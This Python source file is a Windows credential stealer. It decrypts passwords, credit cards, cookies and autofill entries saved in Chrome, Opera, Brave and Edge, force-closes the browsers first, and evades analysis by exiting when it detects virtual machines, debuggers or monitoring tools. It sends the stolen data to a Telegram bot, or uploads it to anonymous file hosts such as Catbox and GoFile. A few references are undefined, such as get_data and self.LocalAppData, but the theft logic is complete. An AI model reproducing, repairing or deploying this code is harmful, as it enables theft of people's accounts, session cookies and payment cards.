import ctypes
import json
import asyncio
import base64
import sys
import aiohttp # type: ignore
import os
import shutil
import sqlite3
import requests
import platform
import psutil # type: ignore
import win32api # type: ignore

from pathlib import Path
from ctypes import *
from urllib.request import urlopen
from json import loads
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore


TOKEN = '%TOKEN%'
CHAT_ID = '%CHAT_ID%'


async def error_handler() -> None:
    exc_type, exc_value, exc_traceback = sys.exc_info()
    
    with open('errors.txt', 'a') as file:
        file.write(f"Type : {exc_type.__name__}\n")
        file.write(f"Message : {exc_value}\n")
        tb = exc_traceback

        while tb.tb_next:
            tb = tb.tb_next

        file.write(f"Fichier : {tb.tb_frame.f_code.co_filename}\n")
        file.write(f"Ligne : {tb.tb_lineno}\n\n")
        
class ListFonction:
    Cards = list()
    Cookies = list()
    Passwords = list()
    Autofills = list()

class WindowsApi:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None

        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))

        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)

        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath,"r", encoding= "utf-8", errors= "ignore") as file:
            jsonContent: dict = json.load(file)

            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]

            return WindowsApi.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(WindowsApi.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"

class Main:
    def __init__(self):
        self.profiles_full_path = []
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv('TEMP')

    async def RunAllFonctions(self):
        await self.kill_browsers()
        await self.list_profiles()
        taskk = [
            asyncio.create_task(self.GetPasswords()),
            asyncio.create_task(self.GetCards()),
            asyncio.create_task(self.GetCookies()),
            asyncio.create_task(self.GetAutoFills()),
            ]
        await asyncio.gather(*taskk)
        await self.InsideFolder()
        await self.SendAllData()
    async def list_profiles(self) -> None:
        try:
            directorys = {
                'Google Chrome': os.path.join(self.LocalAppData, "Google", "Chrome", "User Data"),
                'Opera': os.path.join(self.RoamingAppData, "Opera Software", "Opera Stable"),
                'Opera GX': os.path.join(self.RoamingAppData, "Opera Software", "Opera GX Stable"),    
                'Brave': os.path.join(self.LocalAppData, "BraveSoftware", "Brave-Browser", "User Data"),
                'Edge': os.path.join(self.LocalAppData, "Microsoft", "Edge", "User Data"),
            }
            for name, directory in directorys.items():
                if os.path.isdir(directory):
                    if "Opera" in name:
                        self.profiles_full_path.append(directory)
                    else:
                        self.profiles_full_path.extend(os.path.join(root, folder) for root, folders, _ in os.walk(directory) for folder in folders if folder == 'Default' or folder.startswith('Profile') or "Guest Profile" in folder)

        except:
            pass

    async def kill_browsers(self):
        try:
            process_names = ["chrome.exe", "opera.exe", "edge.exe", "firefox.exe", "brave.exe"]
            process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)

            stdout, stderr = await process.communicate()
            if not process.returncode != 0:
                output_lines = stdout.decode(errors="ignore").split('\n')
                for line in output_lines:
                    for process_name in process_names:
                        if process_name.lower() in line.lower():
                            parts = line.split()
                            pid = parts[1]
                            process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                            await process.communicate()
        except:
            pass

    async def GetPasswords(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]
                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                LoginData = os.path.join(path, "Login Data")
                copied_file_path = os.path.join(self.Temp, "Logins.db")
                shutil.copyfile(LoginData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select origin_url, username_value, password_value from logins')
                logins = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for login in logins:
                    if login[0] and login[1] and login[2]:
                        ListFonction.Passwords.append(f"URL : {login[0]}\nUsername : {login[1]}\nPassword : {WindowsApi.Decrpytion(login[2], key)}\nBrowser : {BrowserName}\n======================================================================\n")
        except:
            pass
    async def GetCards(self) -> None:
        try:
            for path in self.profiles_full_path:
                index = path.find("User Data")
                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                WebData = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "Web.db")
                shutil.copyfile(WebData, copied_file_path)
                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select card_number_encrypted, expiration_year, expiration_month, name_on_card from credit_cards')
                cards = cursor.fetchall()
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:pass
                for card in cards:
                    if card[2] < 10:
                        month = "0" + str(card[2])
                    else:month = card[2]
                    ListFonction.Cards.append(f"{WindowsApi.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
        except:
            pass 
    async def GetCookies(self) -> None:
        try:
            for path in self.profiles_full_path:
                BrowserName = "None"
                index = path.find("User Data")

                if index != -1:
                    user_data_part = path[:index + len("User Data")]
                if "Opera" in path:
                    user_data_part = path
                    BrowserName = "Opera"
                else:
                    text = path.split("\\")
                    BrowserName = text[-4] + " " + text[-3]

                key = WindowsApi.GetKey(os.path.join(user_data_part, "Local State"))
                CookieData = os.path.join(path, "Network", "Cookies")
                copied_file_path = os.path.join(self.Temp, "Cookies.db")
            
                try:
                    shutil.copyfile(CookieData, copied_file_path)
                except:
                    pass

                database_connection = sqlite3.connect(copied_file_path)
                cursor = database_connection.cursor()
                cursor.execute('select host_key, name, path, encrypted_value,expires_utc from cookies')
                cookies = cursor.fetchall()
             
                try:
                    cursor.close()
                    database_connection.close()
                    os.remove(copied_file_path)
                except:
                    pass

                for cookie in cookies:
                    dec_cookie = WindowsApi.Decrpytion(cookie[3], key)
                    ListFonction.Cookies.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{dec_cookie}\n")

        except:
            pass

    async def GetAutoFills(self) -> None:
        try:
            for path in self.profiles_full_path:
                autofill_data = os.path.join(path, "Web Data")
                copied_file_path = os.path.join(self.Temp, "AutofillData.db")                
                shutil.copyfile(autofill_data, copied_file_path)
                with sqlite3.connect(copied_file_path) as database_connection:
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT * FROM autofill')
                    autofills = cursor.fetchall()
                for autofill in autofills:
                    if autofill:
                        ListFonction.Autofills.append(f"data: {autofill[0]}\nvalue: {autofill[1]}\n==============================\n")
                try:
                    cursor.close()
                    os.remove(copied_file_path)
                except:pass  
        except Exception:
            error_handler()


    async def InsideFolder(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)

            if os.path.isdir(filePath):
                shutil.rmtree(filePath)

            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Browsers"))
          
            if ListFonction.Passwords:
                with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for passwords in ListFonction.Passwords:
                        file.write(passwords)
            if ListFonction.Cards:
                with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for cards in ListFonction.Cards:
                        file.write(cards)
            if ListFonction.Cookies:
                with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for cookies in ListFonction.Cookies:
                        file.write(cookies)
            if ListFonction.Autofills:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for autofill in ListFonction.Autofills:
                        file.write(autofill)
           
          
            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Browsers"))
                except:pass


        except Exception:
            error_handler()

    async def SendKeyWords(self) -> None:
        try:
            cookies = []
            passwords = []
            autofills = []
            
            words = ["keyword_example.com"] 

            for word in words:
                found_autofill = any(word in autofill for autofill in ListFonction.Autofills)
                found_password = any(word in password for password in ListFonction.Passwords)
                found_cookie = any(word in cookie for cookie in ListFonction.Cookies)
                
                if found_cookie: 
                    cookies.append(word)
                if found_password: 
                    passwords.append(word)
                if found_autofill: 
                    autofills.append(word)

            text = f"<b>📚 <i><u>{platform.node()} - Keywords Results</u></i></b>\n\n"
            if cookies: 
                text += f"<b>Cookies:</b>\n<code>{', '.join(cookies if cookies else None)}</code>\n"
            if passwords: 
                text += f"<b>Passwords:</b>\n<code>{', '.join(passwords if passwords else None)}</code>\n"
            if autofills: 
                text += f"<b>Autofills:</b>\n<code>{', '.join(autofills if autofills else None)}</code>\n"

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    pass

        except Exception as e:
            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")

    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)

            text = f"""
<b>👤  <i><u>{platform.node()} - Files Counts</u></i></b>

<b>Cards:</b> <code>{str(len(ListFonction.Cards))}</code>
<b>Passwords:</b> <code>{str(len(ListFonction.Passwords))}</code>
<b>Cookies:</b> <code>{str(len(ListFonction.Cookies))}</code>
<b>Autofills:</b> <code>{str(len(ListFonction.Autofills))}</code>
"""

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    pass

            await self.SendContains()
            
            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 15:
                send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                document_payload = {
                    'chat_id': CHAT_ID,
                }

                requests.post(send_document_url, data=document_payload, files={'document': open(filePath + ".zip", 'rb')})
            
            else:
                succes = await UploadFiles.upload_file(filePath + ".zip")

                if succes is not None:
                    text = f"<b>{platform.node()} - File Link</b>\n\n<b>{succes}</b>"

                    message_payload = {
                        'chat_id': CHAT_ID,
                        'text': text,
                        'parse_mode': 'HTML'
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.post(send, data=message_payload) as response:
                            pass
                else:
                    text = "<b>Can't Send File With GoFile</b>"

                    message_payload = {
                        'chat_id': CHAT_ID,
                        'text': text,
                        'parse_mode': 'HTML'
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.post(send, data=message_payload) as response:
                            pass

            try:

                os.remove(filePath + ".zip")
                shutil.rmtree(filePath)

            except Exception as e:
                error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")

        except Exception as e:
            error_handler(f"An error occurred: {type(e).__name__} - {str(e)}")
        
class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except aiohttp.ClientError as e:
            error_handler(f"An error occurred while fetching GoFile server: {type(e).__name__} - {str(e)}")
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()

            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        return data["data"]["downloadPage"]
        except Exception as e:
            error_handler(f"An error occurred with GoFile (aiohttp): {e}")
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')

                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        return result
        except Exception as e:
            error_handler(f"An error occurred while uploading to Catbox: {type(e).__name__} - {str(e)}")
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            error_handler(f"File.io upload failed with status: {response.status}")
                            return None
        except Exception as e:
            error_handler(f"An error occurred while uploading to File.io: {type(e).__name__} - {str(e)}")
            return None

    @staticmethod
    async def upload_uguu(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                        data = await response.json()
                        return data.get("url")
        except Exception as e:
            error_handler(f"An error occurred while uploading to Uguu: {type(e).__name__} - {str(e)}")
            return None

    @staticmethod
    async def upload_anonfiles(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))

                    async with session.post('https://api.anonfiles.com/upload', data=form) as response:
                        data = await response.json()
                        return data["data"]["file"]["url"]["full"]
        except Exception as e:
            error_handler(f"An error occurred while uploading to AnonFiles: {type(e).__name__} - {str(e)}")
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
            ('GoFile', UploadFiles.upload_gofile),
            ('Uguu', UploadFiles.upload_uguu),
            ('AnonFiles', UploadFiles.upload_anonfiles),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception as e:
                error_handler(f"An error occurred with {platform}: {type(e).__name__} - {str(e)}")
                continue
        
        return "All upload attempts failed."

class anti_vm:
    async def run_all_fonctions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception:
            error_handler()

    async def check_disk_space(self) -> bool:
        try:
            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 50:
                ctypes.windll.kernel32.ExitProcess(0)
            min_disk_space_gb = 50
            if len(sys.argv) > 1:
                min_disk_space_gb = float(sys.argv[1])
            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
            if free_space_gb < min_disk_space_gb:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

    async def check_recent_files(self) -> bool:
        try:
            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
            if len(os.listdir(recent_files_folder)) < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 50:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 6:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            video_controller_info = stdout.decode(errors='ignore').splitlines()
            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

    async def check_for_suspicious_files(self) -> None:
        try:
            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
            if os.path.exists(temp_file_path):
                ctypes.windll.kernel32.ExitProcess(0)
            try:
                machine_name = platform.uname().machine.lower()
                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
                    ctypes.windll.kernel32.ExitProcess(0)
            except AttributeError:
                pass

            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
          
            running_processes = [
                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
                if process.name().lower() in suspicious_process_names
            ]
            if running_processes:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

    async def check_system_manufacturer(self) -> None:
        try:
            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout1, stderr1 = await process1.communicate()

            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout2, stderr2 = await process2.communicate()

            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception:
            error_handler()

        
if __name__ == '__main__':
    if os.name == "nt":
        anti = anti_vm()
        asyncio.run(anti.run_all_fonctions())

        main = get_data()
        asyncio.run(main.RunAllFonctions())
    else:
        print('run only on windows operating system')
